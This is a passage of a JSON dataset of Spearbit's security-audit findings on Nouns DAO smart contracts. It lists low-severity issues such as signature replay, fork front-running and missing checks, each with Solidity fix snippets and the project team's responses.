invalid by itself is high. However, since there is enough time prior to that moment for both cancellation and execution and all these actions come through a permissioned workflow, the impact is better described as medium. Therefore, per low probability and medium impact, the severity is set to be low.\n\n## Recommendation\nA `seta` timestamp is included, consider the logic:\n```\nif (block.timestamp > proposal.eta + GRACE_PERIOD) {\n    return Expired;\n}\n```\nin all state functions:\n\n### At NounsDAOLogicV2:state():\n```solidity\nfunction state(uint256 proposalId) public view returns (ProposalState) {\n    ...\n    return ProposalState.Executed;\n} else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) {\n    } else if (block.timestamp > proposal.eta + timelock.GRACE_PERIOD()) {\n        return ProposalState.Expired;\n}\n```\n\n### At NounsDAOV3Proposals:stateInternal():\n```solidity\nfunction stateInternal(NounsDAOStorageV3.StorageV3 storage ds, uint256 proposalId)\n    internal\n    view\n    returns (NounsDAOStorageV3.ProposalState)\n{\n    ...\n    return NounsDAOStorageV3.ProposalState.Executed;\n} else if (block.timestamp >= proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n    } else if (block.timestamp > proposal.eta + getProposalTimelock(ds, proposal).GRACE_PERIOD()) {\n        return NounsDAOStorageV3.ProposalState.Expired;\n}\n```\n\n### At NounsDAOLogicV1Fork:state():\n```solidity\nfunction state(uint256 proposalId) public view returns (ProposalState) {\n    ...\n    return ProposalState.Executed;\n} else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) {\n    } else if (block.timestamp > proposal.eta + timelock.GRACE_PERIOD()) {\n        return ProposalState.Expired;\n}\n```\n\n## Nouns\nWe consider this issue to be of very low severity since it effectively just shortens the time a proposal can be queued by 1 second. We will not fix it at this time.\n\n## Spearbit\nIn addition to that, the impact is also that at `eta + timelock.GRACE_PERIOD` timestamp, any proposal will not be cancellable, but this proposal's transactions will be executable by a direct call to `NounsDAOExecutorV2`'s `executeTransaction()`. Acknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21359",
      "title": "Missing require checks in NounsDAOV3Proposals.execute() andexecuteOnTimelockV1() functions",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity \nLow Risk\n\n## Context \n- `NounsDAOV3Proposals.sol#L470`\n- `NounsDAOV3Proposals.sol#L481`\n\n## Description \nThe following require checks are missing:\n\n- **Function** `NounsDAOV3Proposals.execute()`:\n  ```\n  require(proposal.executeOnTimelockV1 == false, 'NounsDAO::execute: executeOnTimelockV1 = true');\n  ```\n\n- **Function** `NounsDAOV3Proposals.executeOnTimelockV1()`:\n  ```\n  require(proposal.executeOnTimelockV1 == true, 'NounsDAO::executeOnTimelockV1: executeOnTimelockV1 = false');\n  ```\n\nDue to the absence of these require checks, the `NounsDAOLogicV3` contract leaves open a vulnerability where if two identical proposals, with the exact same transactions, are concurrently queued in both the timelockV1 and timelock contracts, the proposal originally intended for execution on timelock can be executed on timelockV1 and vice versa.\n\nThe consequence of this scenario is that it essentially blocks or causes a Denial of Service to the legitimate execution path of the corresponding proposal for either timelockV1 or timelock. This occurs because each proposal has been inadvertently executed on the unintended timelock contract due to the lack of a condition check that would otherwise ensure the correct execution path.\n\n## Recommendation \nConsider adding a require that checks the `executeOnTimelockV1` flag in both functions.\n\n## Nouns \nThe risk presented is very unlikely. Hence, leaving as is, won't fix.\n\n## Spearbit \nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21358",
      "title": "A single invalid/expired/cancelled signature will prevent the creation and updation of proposals",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `NounsDAOV3Proposals.sol#L956-L962`\n- `NounsDAOV3Proposals.sol#L815`\n- `NounsDAOV3Proposals.sol#L401`\n\n## Description\nFor proposals created via `proposeBySigs()` or updated via `updateProposalBySigs()`, if the proposer includes even a single invalid/expired/cancelled signature (without performing offchain checks to prevent this scenario), `verifyProposalSignature()` will revert and the creation/updation of proposals will fail. A proposer accidentally including one or more invalid/expired/cancelled signatures submitted accidentally by a signer will cause the proposal creation/updation to fail, lose gas used and will have to resubmit after checking and excluding such signatures. This also allows griefing by signers who intentionally submit an invalid/expired signature or a valid one which is later cancelled (using `cancelSig()`) just before the proposal is created/updated. Note that while the signers currently have cancellation powers which gives them a greater griefing opportunity even at later proposal states, that has been reported separately in a different issue.\n\n## Recommendation\n1. Consider having `verifyProposalSignature()` return a status code (invalid/expired/cancelled) which is then used to skip the consideration of such signatures. The voting power of other signatures may still add up to being sufficient for the proposal to be created or updated.\n2. Consider checking that voting power of valid signatures during updation exceeds the threshold instead of requiring the exact ordered list of original signers. The updation signers may be a subset of the original signers but still pass the proposal threshold to indicate support for updation.\n\n## Nouns\nAcknowledged, but due to low risk, won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21357",
      "title": "Potential re-minting of previously burnt NounsTokenFork",
      "impact": "LOW",
      "content": "## Vulnerability Report\n\n## Severity\n**Low Risk**\n\n## Context\n- **NounsTokenFork.sol**: Lines 142-157\n- **NounsDAOForkEscrow.sol**: Lines 168-176\n\n## Description\nIn the current implementation of the `NounsTokenFork` contract, there is a potential vulnerability that allows for a previously burned `NounsTokenFork` to be re-minted. This risk occurs due to the user retaining the status of `escrow.ownerOfEscrowedToken(forkId, nounId)` even after the `claimFromEscrow()` function call. Presently, no tokens are burned outside of the `NounsAuctionHouseFork` and are only burned in the case that no bids are placed for that `nounId`. However, this issue could become exploitable under the following circumstances:\n\n1. If a new `burn()` functionality is added elsewhere in the code.\n2. If a new contract is granted the Minter role.\n3. If the `NounsAuctionHouseFork` is updated to a malicious implementation.\n\nAdditionally, exploiting this potential issue would lead to the `remainingTokensToClaim` variable decreasing, causing it to underflow (<0). In this situation, some legitimate users would be unable to claim their tokens due to this underflow.\n\n## Recommendation\nConsider updating the `escrowedTokensByForkId[forkId_][tokenId]` mapping in the `NounsDAOForkEscrow` contract every time `claimFromEscrow()` is called.\n\n## Nouns\nSince there is no way to currently get the `Noun` burned without changing minter/contracts, we choose not to introduce new logic for fixing this. If the forked DAO chooses to enable burning, they could update the token contract and change the `claimFromEscrow()` logic.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21356",
      "title": "A malicious proposer can replay signatures to create duplicate proposals",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\nNounsDAOV3Proposals.sol#L844-L851\n\n## Description\nSuppose Bob and Alice sign a proposal for Carl, authorizing a transfer of exactly 100,000 USDC to a specified address (xyz), and their signatures were created with a long expiration time. \n\nFollowing the normal procedure, Carl creates the proposal, the vote is held, and the proposal enters the 'succeeded' state. However, since Bob and Alice's signatures are still valid due to the long expiration time, Carl could reuse these signatures to create another proposal for an additional transfer of 100,000 USDC to the same xyz address, as long as Bob and Alice still retain their voting power/nouns. Thus, Carl could double the intended transfer amount without their explicit authorization.\n\nWhile it is true that Bob and Alice can intervene by either cancelling the new proposal or invalidating their signatures before the creation of the second proposal, it necessitates them to take action, which may not always be feasible or timely.\n\n## Recommendation\nConsider adding a nonce as part of these signatures and invalidate the nonce once used.\n\n## Nouns\nAdding a nonce system is too big of a change. We consider this issue to be very low risk, hence won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21355",
      "title": "Withdrawing from fork escrow can be front-run to prevent withdrawal and force join the fork",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `NounsDAOV3Fork.sol#L93C74-L100`\n- `NounsDAOV3Fork.sol#L109-L130`\n\n## Description\n`withdrawFromForkEscrow()` is meant to allow a fork escrowed holder to change their mind about joining the fork by withdrawing their escrowed tokens. However, the current design allows another fork joining holder to front-run a `withdrawFromForkEscrow()` transaction with their `escrowToFork()` to exceed the fork threshold and also call `executeFork()` with it. If the threshold was already met, then this doesn't even have to be another fork joining holder. This will cause `withdrawFromForkEscrow()` to fail because the fork period is now active, and that holder is forced to join the fork with their previously escrowed tokens.\n\n## Scenario\nAlice and Bob decide to create/join a fork with their 10 & 15 tokens respectively to meet the 20% fork threshold (assume 100 Nouns). Alice escrows first but then changes her mind and calls `withdrawFromForkEscrow()`. Bob observes this transaction (assume no private mempool) and front-runs it with his `escrowToFork()` + `executeFork()`. This forces Alice to join the fork instead of staying back. \n\n`withdrawFromForkEscrow()` does not always succeed and is likely effective only in the early stages of the escrow period but not towards the end when the fork threshold is almost met. Late fork escrowers do not have as much opportunity as others to change their mind about joining the fork.\n\n## Recommendation\nFront-running is always possible in such protocols, and the standard mitigation is to use MEV protections for sensitive actions. Consider a fork execution delay of 1-2 days which is enforced after reaching the threshold but before executing the fork, so that escrowed participants can evaluate their decision to join the fork one last time.\n\n## Nouns\nWe don't think this is an issue. Escrowing your Noun to fork comes with the knowledge that it may fork. We don't need a \"risk free\" escrowing. Won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21354",
      "title": "Two/three forks in a row will force expiration of execution-awaiting proposals",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ProposeDAOV3UpgradeMainnet.s.sol#L15 \n- NounsDAOV3Admin.sol#L133 \n- NounsDAOExecutorV2.sol#L80\n\n## Description\nProposal execution on the original DAO is disallowed during the forking period. While the proposed fork period is currently 7 days, `MAX_FORK_PERIOD` is 14 days. `GRACE_PERIOD`, which is the time allowed for a queued proposal to execute, has been increased from the existing 14 days to 21 days specifically to account for the fork period.\n\nHowever, if there are three consecutive forks whose active fork periods add up to 21 days, or two forks in the worst case if the fork period is set to `MAX_FORK_PERIOD`, then all queued proposals will expire and cannot be executed. Malicious griefing forkers can collude to time and break up their voting power to fork consecutively to prevent execution of queued proposals on the original DAO, thus forcing them to expire.\n\n## Recommendation\nConsider introducing a short delay, e.g., 2-3 days, between the end of a fork and the start of the next one. This will allow execution of queued proposals during this fork delay period without forcing their expiration.\n\n## Nouns\nIn order to perform such a griefing attack, given a threshold of 20% to fork, the attacker would need to have 36% (20% + 16%) of nouns to do 2 forks in a row, or 48% to do 3 forks in a row. This seems highly unlikely; therefore, we won't be implementing a fix for this.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21353",
      "title": "The version string is missing from the domain separator allowing submission of signatures in different protocol versions",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `NounsDAOV3Votes.sol#L164-L167`\n- `NounsDAOV3Proposals.sol#L981-L983`\n- `NounsDAOLogicV1Fork.sol#L560-L562`\n- `ERC721CheckpointableUpgradeable.sol#L146`\n\n## Description\nThe version string seems to be missing from the domain separator. According to EIP-712:\n\n> Protocol designers only need to include the fields that make sense for their signing domain. Unused fields are left out of the struct type.\n\nWhile it's not a mandatory field as per the EIP-712 standard, it would be sensible for the protocol to include the version string in the domain separator, considering that the contracts are upgradable. For instance, if a user generates a signature for version v1.0, they may not want the signature to remain valid following an upgrade.\n\n## Recommendation\nIt is recommended to also include the version string in the domain separator.\n\n## Nouns\nDue to very low risk and non-trivial fix required, we will not fix this for now.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21352",
      "title": "No storage gaps for upgradeable contracts might lead to storage slot collision",
      "impact": "LOW",
      "content": "## Security Issue Report\n\n## Severity\n**Low Risk**\n\n## Context\n- `NounsDAOExecutorV2.sol#L46`\n- `NounsAuctionHouseFork.sol#L41`\n- `NounsDAOLogicV1Fork.sol#L105`\n- `NounsTokenFork.sol#L39`\n\n## Description\nWhen implementing upgradable contracts that inherit, it is important that there are storage gaps in case new storage variables are later added to the inherited contracts. If a storage gap variable isn't added, when the upgradeable contract introduces new variables, it may override the variables in the inheriting contract.\n\nAs noted in the OpenZeppelin Documentation: \n\n\"You may notice that every contract includes a state variable named `__gap`. This is empty reserved space in storage that is put in place in Upgrade Safe contracts. It allows us to freely add new state variables in the future without compromising the storage compatibility with existing deployments. It isn’t safe to simply add a state variable because it 'shifts down' all of the state variables below in the inheritance chain.\"\n\n## Recommendation\nTo ensure the stability of future storage layout changes to the base contract, it is recommended to add a `__gap` variable as the last storage variable in these upgradeable contracts, resulting in a fixed total number (50 for example) of storage slots. Please note that as subsequent versions include additional storage variables, the `__gap` variable space will need to be adjusted accordingly to maintain the fixed number of slots.\n\n## Nouns\nIIUC a storage gap is only helpful if the contract which has a storage gap is itself being inherited. The contracts you mentioned, `NounsDAOExecutorV2`, `NounsAuctionHouseFork`, `NounsDAOLogicV1Fork`, and `NounsTokenFork`, are not being inherited. Unless there's a larger reason, won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21351",
      "title": "Single-step ownership change is risky",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- NounsAuctionHouseFork.sol#L34\n- NounsTokenFork.sol#L20\n\n## Description\nThe codebase primarily follows a two-step ownership change pattern. However, in specific sections, a single-step ownership change is utilized.\n\nTwo-step ownership change is preferable, where:\n- The current owner proposes a new address for the ownership change.\n- In a separate transaction, the proposed new address can then claim the ownership.\n\n## Recommendation\nConsider implementing a two-step ownership transfer process throughout the codebase, similar to the approach used in `Ownable2StepUpgradeable`.\n\n## Nouns\nSince these ownership changes would have to go through a proposal process, this seems very low risk. We won't introduce a fix for this one.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21350",
      "title": "A signer of multiple proposals will cause all of them except one to fail creation",
      "impact": "LOW",
      "content": "## Low Risk Issue\n\n## Context\n- **File:** NounsDAOV3Proposals.sol\n- **Lines:** 818, 787-798\n\n## Description\nLike proposers, signers are also allowed to back only one proposal at a time. As commented: \"This is a spam protection mechanism to limit the number of proposals each noun can back.\" However, unlike proposers who know which of their proposals are active and when, signers may not readily have that insight and can sign multiple proposals they may want to back. If more than one such proposal is proposed, then only the first one will pass the `checkNoActiveProp()` for this signer, and all the others will fail this check, thereby causing the proposal creation itself to fail.\n\nA signer of multiple proposals will cause all of them except one to fail creation. Other proposals will then have to exclude such signatures and resubmit. This could be accidental or used by malicious signers for griefing proposal creations.\n\n## Recommendation\nInstead of reverting in `checkNoActiveProp()` when proposal signers already have an active proposal, have it return a boolean to help skip such signers from consideration in its callers. Not all signers included in `proposeBySigs()` have to necessarily be part of the proposal when created. The `propose()` function can choose to revert if `checkNoActiveProp()` returns false.\n\n## Nouns\nThanks for reporting. We agree this can improve UX a bit, but we think the clients should be able to identify signers with an active proposal. **Won't fix**\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21349",
      "title": "Zero value ERC-20 transfers can be performed on sending treasury funds to quitting member or forked DAO, denying the whole operation if one of erc20TokensToIncludeInQuit tokens doesn't allow this",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- `NounsDAOLogicV1Fork.sol#L210-L215`\n- `NounsDAOV3Fork.sol#L225-L230`\n\n## Description\nSome tokens do not allow for zero value transfers. Such behavior does not violate the ERC-20 standard, is not prohibited in any way, and can occur in any non-malicious token. \n\nAs a somewhat well-known example, Aave's LEND requires the amount to be positive:\n\n```solidity\nfunction transfer(address _to, uint256 _value) returns(bool) {\n    require(balances[msg.sender] >= _value);\n    require(balances[_to] + _value > balances[_to]);\n}\n```\n\nAsstETH, which is currently used by the Nouns treasury, is upgradable. It cannot be ruled out that it might require the same in the future for any reason. \n\nZero value itself can occur in a situation when a valid token was added to `erc20TokensToIncludeInFork`, but this token's timelock balance is currently empty. \n\nNounsDAOLogicV1Fork's `quit()` and NounsDAOV3Fork's `executeFork()` and `joinFork()` will be unavailable in such scenarios, meaning the DAO forking workflow will be disabled. Since the update of `erc20TokensToIncludeInFork` goes through proposal mechanics and major tokens rarely upgrade, while there is an additional requirement of an empty balance, the cumulative probability of the scenario can be deemed quite low. However, the core functionality blocking impact is high, hence setting the severity to low.\n\n## Recommendation\nConsider controlling the amount to be positive in both cases, for example:\n\n### NounsDAOLogicV1Fork's quit()\n\n```solidity\nfor (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) {\n    IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]);\n    uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n\n    if (tokensToSend > 0) {\n        bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend);\n        if (!erc20Sent) revert QuitERC20TransferFailed();\n    }\n}\n```\n\n### The NounsDAOV3Fork: sendProRataTreasury()\n\nThis is called during the `executeFork()` & `joinFork()` functions:\n\n```solidity\nfor (uint256 i = 0; i < erc20Count; ++i) {\n    IERC20 erc20token = IERC20(ds.erc20TokensToIncludeInFork[i]);\n    uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenCount) / totalSupply;\n\n    if (tokensToSend > 0) {\n        bool erc20Sent = timelock.sendERC20(newDAOTreasury, address(erc20token), tokensToSend);\n        if (!erc20Sent) revert ERC20TransferFailed();\n    }\n}\n```\n\nThe motivation for the suggestion is also gas optimization: while DAO transfers are once per fork, in the `NounsDAOLogicV1Fork`'s `quit()` case, every quitting member will pay for such empty transfers, which carry substantial gas costs.\n\n## Nouns\nAcknowledged. Fix PR here: [nounsDAO/nouns-monorepo#727](https://github.com/nounsDAO/nouns-monorepo/pull/727).\n\n## Spearbit\nFixed as recommended.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21348",
      "title": "USDC-paying proposals executing between ProposeDAOV3UpgradeMainnet andProposeTimelockMigrationCleanupMainnet will fail",
      "impact": "LOW",
      "content": "## Low Risk Issue Report\n\n**Severity:** Low Risk\n\n**Context:** Known-Issues ProposeDAOV3UpgradeMainnet.s.sol#L106-L116\n\n**Description:**  \nAs explained in one of the Known Issues, ProposeDAOV3UpgradeMainnet contains a proposal that transfers the ownership of `PAYER_MAINNET` and `TOKEN_BUYER_MAINNET` from `timelockV1` to `timelockV2`. There could be older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet which assume `timelockV1` ownership of these contracts. Older USDC-paying proposals executing after ProposeDAOV3UpgradeMainnet will fail.\n\n**Recommendation:**  \nWhile the proposed mitigation is: \"Our mitigation to this issue will be communication with the DAO ahead of time, and should we see any proposals in this state, we will contact their proposers immediately and help them re-propose,\" the number of affected proposals could be reduced if the ownership transfers of `PAYER_MAINNET` and `TOKEN_BUYER_MAINNET` are moved from ProposeDAOV3UpgradeMainnet to ProposeTimelockMigrationCleanupMainnet. This change will at least prevent the older proposals executing between these two proposals from failing due to this reason.\n\n**Nouns:**  \nFixed: [nounsDAO/nouns-monorepo#734](https://github.com/nounsDAO/nouns-monorepo/pull/734).  \nSpearbit: Verified that PR 734 fixes the issue as recommended.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21347",
      "title": "DAO withdraws forked ids from escrow without emphasizing total supply increase which contradicts the spec and can catch holders unaware",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n`NounsDAOV3Fork.sol#L160-L178`\n\n## Description\nWithdrawal of original nouns with IDs of the forked tokens from escrow after the successful fork is a material event for all original nouns holders, as the adjusted total supply is increased as long as the withdrawal recipient is not the treasury.\n\nThere were special considerations regarding Nouns withdrawal impact after the fork:\nFor this reason, we're considering a change to ensure transfers go through a new function that helps Nouners understand the implications, e.g., by setting the function name to `withdrawNounsAndGrowTotalSupply` or something similar, as well as emitting events that indicate the new (and greater) total supply used by the DAO.\n\nHowever, currently, `withdrawDAONounsFromEscrow()` neither has a special name, nor mentions the increase of adjusted total supply when `to != ds.timelock`:\n\n```solidity\n/**\n* @notice Withdraws nouns from the fork escrow after the fork has been executed\n* @dev Only the DAO can call this function\n* @param tokenIds the tokenIds to withdraw\n* @param to the address to send the nouns to\n*/\nfunction withdrawDAONounsFromEscrow(\n    NounsDAOStorageV3.StorageV3 storage ds,\n    uint256[] calldata tokenIds,\n    address to\n) external {\n    if (msg.sender != ds.admin) {\n        revert AdminOnly();\n    }\n    ds.forkEscrow.withdrawTokens(tokenIds, to);\n    emit DAOWithdrawNounsFromEscrow(tokenIds, to);\n}\n```\n\nNouns holder might not understand the consequences of withdrawing the nouns from escrow and might support such a proposal. As of now, it is approximately a $65k loss per noun withdrawn cumulatively for current holders. The vulnerability scenario here is a holder supporting the proposal without understanding the consequences for supply, as no emphasis is made, and then suffers their share of loss as a result of its execution.\n\nPer low likelihood and impact, the severity is set to be low.\n\n## Recommendation\nConsider emitting a special event when `to != timelock`, for example:\n\n```solidity\nif (to != address(ds.timelock)) {\n    emit DAONounsSupplyIncreasedFromEscrow(tokenIds.length, to);\n}\n```\n\nIn order to emphasize the supply increase, consider splitting `withdrawDAONounsFromEscrow()` into two functions:\n- First, for example, `withdrawDAONounsFromEscrowToTreasury`, having no `to` argument and performing `ds.forkEscrow.withdrawTokens(tokenIds, address(ds.timelock))`\n- Second, for example, `withdrawDAONounsFromEscrowIncreasingTotalSupply`, requiring `to != address(ds.timelock)`, performing `ds.forkEscrow.withdrawTokens(tokenIds, to)` and emitting `DAONounsSupplyIncreasedFromEscrow`\n\n## Nouns\n**Fix:** nounsDAO/nouns-monorepo#735.  \n**Spearbit:** Fix looks good.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21346",
      "title": "Potential risks from outdated OpenZeppelin dependencies in the Nouns DAO v3",
      "impact": "LOW",
      "content": "## Security Advisory\n\n## Severity\n**Low Risk**\n\n## Context\n- `yarn.lock#L4191-L4192`\n- `yarn.lock#L4196-L4197`\n\n## Description\nThe OpenZeppelin libraries are being used throughout the Nouns DAO v3 codebase. These libraries, however, are locked at version **4.4.0**, which is an outdated version that has some known vulnerabilities. Specifically:\n\n- **TheSignatureChecker.isValidSignatureNow** is not expected to revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-1271 as expected. The contracts that may be affected are those that use SignatureChecker to check the validity of a signature and handle invalid signatures in a way other than reverting.\n\n- **TheERC165Checker.supportsInterface** is designed to always successfully return a boolean, and under no circumstances revert. However, an incorrect assumption about Solidity 0.8's `abi.decode` allows some cases to revert, given a target contract that doesn't implement EIP-165 as expected, specifically if it returns a value other than 0 or 1. The contracts that may be affected are those that use ERC165Checker to check for support for an interface and then handle the lack of support in a way other than reverting.\n\nAt present, these vulnerabilities do not appear to have an impact on the Nouns DAO codebase, as corresponding functions revert upon failure. Nevertheless, these vulnerabilities could potentially impact future versions of the codebase.\n\n## Recommendation\nAs a security measure, it is advisable to update the version of the OpenZeppelin libraries in both the `yarn.lock` and the `package.json` files.\n\n## Nouns\nWe will consider it for the future. For now, we won't fix.\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "tchkvsky",
        "Christos Papakonstantinou",
        "Rajeev",
        "r0bert",
        "hyh"
      ]
    },
    {
      "id": "21345",
      "title": "Objection period will be disabled after the update to V3 is completed",
      "impact": "LOW",
      "content": "## Severity: Low Risk\n\n## Context\n- ProposeDAOV3UpgradeMainnet.s.sol\n- ProposeTimelockMigrationCleanupMainnet.s.sol\n\n## Description\nNouns DAO V3 introduces a new functionality called **objection-only period**. This is a conditional voting period that gets activated upon a last-minute proposal swing from defeated to successful, affording voters more reaction time. Only against votes will be possible during the objection period.\n\nAfter the proposals created in `ProposeDAOV3UpgradeMainnet.s.sol` and `ProposeTimelockMigrationCleanupMainnet.s.sol` are executed, `lastMinuteWindowInBlocks` and `objectionPeriodDurationInBlocks` will still remain set to 0. A new proposal will have to be created, passed, and executed in the DAO that calls the `_setLastMinuteWindowInBlocks()` and `_setObjectionPeriodDurationInBlocks()` functions to enable this functionality.\n\n## Recommendation\nConsider adding to the `ProposeTimelockMigrationCleanupMainnet.s.sol`'s proposal 2 new transactions that call and set the `_setLastMinuteWindowInBlocks()` and `_setObjectionPeriodDurationInBlocks()`.\n\n## Nouns\nThis was done intentionally as we want the upgrade to start with this feature turned off. We want the DAO to vote separately on the parameters they want to turn it on with. **Won't fix.**\n\n## Spearbit\nAcknowledged.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Nouns DAO",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
